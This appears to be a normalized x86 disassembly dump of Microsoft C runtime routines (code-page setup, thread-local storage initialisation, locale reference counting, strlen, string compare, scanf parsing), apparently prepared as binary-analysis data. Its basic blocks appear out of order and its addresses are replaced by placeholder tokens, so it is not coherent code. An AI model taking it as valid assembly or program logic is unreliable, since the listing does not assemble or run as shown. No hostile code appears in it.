lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_40cfec
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_40cfec
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_4042ed
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
mov al [ ebx + 0x1 ]
add ebx 0x2
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_40aef0
add esp 0xc
mov [ esi + eax + 0x11d ] bl
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_407413
push 0xc
push r--data
call sub_409f90
call sub_407dbd
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_409da0
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4074ae
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_409fd5
retn
push 0x20
call sub_406073
cmp esi rw-data
je r-xdata
push esi
call sub_404538
pop ecx
sub_4074b7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_4047c5
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_407533
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_4074b7
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_40721f
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_40aef0
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4042ed
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_4071f0
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
mov [ eax ] si
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov esi ebx
call sub_407283
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
add esi 0x2
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_40aef0
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_4071f0
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
add esi 0x2
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_40771c
push 0x14
push r--data
call sub_409f90
or [ ebp - 0x20 ] 0xffffffff
call sub_407dbd
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_407413
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_4074b7
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_40c067
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_409fd5
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_407533
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_405d3f
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_404538
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_404538
pop ecx
push 0xd
call sub_409da0
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40787d
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_404538
pop ecx
sub_4078d4
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_407963
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_4079fc
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_404538
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_404538
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_404538
push [ esi + 0xc0 ]
call sub_404538
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_40d159
push [ esi + 0xd4 ]
call sub_404538
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_404538
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_404538
pop ecx
push [ esi + 0xb0 ]
call sub_404538
push [ esi + 0xbc ]
call sub_404538
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_404538
push [ esi + 0xbc ]
call sub_40d539
pop ecx
pop ecx
push eax
call sub_404538
pop ecx
push eax
call sub_404538
push [ esi + 0xbc ]
call sub_40d4d0
pop ecx
pop ecx
sub_407b47
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_4078d4
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_407963
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_4079fc
pop ecx
sub_407b94
push 0xc
push r--data
call sub_409f90
call sub_407dbd
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_409da0
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
add esi 0x6c
push esi
call sub_407b47
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_407c01
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_407dbd
mov esi [ eax + 0x6c ]
mov eax esi
call sub_409fd5
retn
push 0x20
call sub_406073
sub_407c1f
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_407c53
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
or [ rw-data ] 0xffffffff
jmp r-xdata
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_404538
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_407c90
push 0x8
push r--data
call sub_409f90
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_409da0
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_407d32
push 0xc
call sub_409da0
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_4078d4
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_407d3b
call sub_409fd5
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_407d44
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_407c1f
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_40c0ac
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
push esi
call sub_404538
pop ecx
xor esi esi
push 0x0
push esi
call sub_407c90
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_407dd7
push 0x8
push r--data
call sub_409f90
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_409fd5
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_404538
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_404538
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_404538
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_404538
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_404538
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_404538
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_404538
pop ecx
push 0xd
call sub_409da0
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_404538
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_407ef1
push 0xc
call sub_409da0
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_407efd
push esi
call sub_404538
pop ecx
push edi
call sub_407963
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_404538
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_4079fc
pop ecx
sub_407f06
mov edi edi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_407c53
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_407c16
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_405dfb
push [ rw-data ]
mov esi [ EncodePointer@IAT ]
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_409c26
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_407c53
mov edi [ DecodePointer@IAT ]
push sub_407dd7
push [ rw-data ]
call edi
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_40c0ac
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call edi
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_407c90
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_408081
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_4047c5
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_405d3f
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_40ccfd
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_40d637
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_40cfec
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_4081a0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_408210
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_40829b
mov edi edi
push ebp
mov ebp esp
mov eax [ esi ]
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
mov ecx [ edi ]
push 0x2
push eax
cmp ecx [ ebp + 0xc ]
jne r-xdata
push ecx
call sub_40c146
add esp 0xc
test eax eax
je r-xdata
call sub_40c0ac
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
xor eax eax
pop ebp
retn
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x1
push [ esi ]
push [ ebp + 0xc ]
push [ edi ]
call sub_40af70
add esp 0xc
jmp r-xdata
shl [ esi ] 0x1
sub_4082f2
mov edi edi
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
push eax
call sub_40d7d1
test eax eax
movsx eax [ ebp + 0x8 ]
pop ecx
jne r-xdata
pop ebp
retn
and eax 0xffffffdf
sub eax 0x7
sub_408328
mov edi edi
push ebp
mov ebp esp
push ebx
mov eax ebx
pop ebx
pop ebp
retn
movzx eax bl
push eax
call sub_40d8d6
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
inc [ esi ]
call sub_408312
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
sub_408352
mov edi edi
push ebp
mov ebp esp
sub esp 0x200
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebp - 0x1e8 ] ecx
lea ecx [ ebp - 0x184 ]
mov [ ebp - 0x1a4 ] eax
mov [ ebp - 0x1b0 ] ecx
mov [ ebp - 0x1dc ] 0x15e
mov [ ebp - 0x1d0 ] edi
mov [ ebp - 0x1ec ] edi
mov [ ebp - 0x194 ] edi
cmp esi edi
jne r-xdata
cmp eax edi
je r-xdata
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
or eax 0xffffffff
jmp r-xdata
test [ eax + 0xc ] 0x40
push ebx
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_4042ed
leave
retn
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x1fc ]
call sub_4047c5
mov al [ esi ]
mov [ ebp - 0x1a5 ] 0x0
mov [ ebp - 0x18c ] edi
mov [ ebp - 0x1cc ] edi
test al al
je r-xdata
push eax
call sub_409b27
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0x1f0 ] 0x0
je r-xdata
mov edi esi
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov eax [ ebp - 0x1cc ]
mov eax [ ebp - 0x1f4 ]
and [ eax + 0x70 ] 0xfffffffd
mov al [ edi ]
cmp al 0x25
jne r-xdata
push [ ebp - 0x1a4 ]
dec [ ebp - 0x18c ]
lea esi [ ebp - 0x18c ]
call sub_408328
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
or eax 0xffffffff
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov ebx eax
sar ebx 0x5
shl ecx 0x6
add ecx [ ebx * 4 + rw-data ]
jmp r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408312
mov ebx eax
movzx eax [ edi ]
inc edi
mov [ ebp - 0x194 ] ebx
mov [ ebp - 0x1bc ] edi
cmp eax ebx
jne r-xdata
cmp [ edi + 0x1 ] al
je r-xdata
inc edi
movzx eax [ edi ]
push eax
call sub_40d8d6
pop ecx
test eax eax
jne r-xdata
push [ ebp - 0x1a4 ]
push eax
call sub_40d904
pop ecx
pop ecx
pop ebx
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
cmp ebx 0xffffffff
movzx eax bl
push eax
call sub_40cd35
pop ecx
test eax eax
je r-xdata
cmp al 0x25
jne r-xdata
xor eax eax
mov [ ebp - 0x1e4 ] eax
mov [ ebp - 0x1d1 ] al
mov [ ebp - 0x1ac ] eax
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x19c ] eax
mov [ ebp - 0x1a8 ] al
mov [ ebp - 0x1a7 ] al
mov [ ebp - 0x19d ] al
mov [ ebp - 0x18d ] al
mov [ ebp - 0x1a6 ] al
mov [ ebp - 0x195 ] al
mov [ ebp - 0x185 ] 0x1
mov [ ebp - 0x1d8 ] eax
xor esi esi
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x1d0 ] 0x1
jne r-xdata
push [ ebp - 0x1a4 ]
push [ ebp - 0x194 ]
call sub_40d904
pop ecx
pop ecx
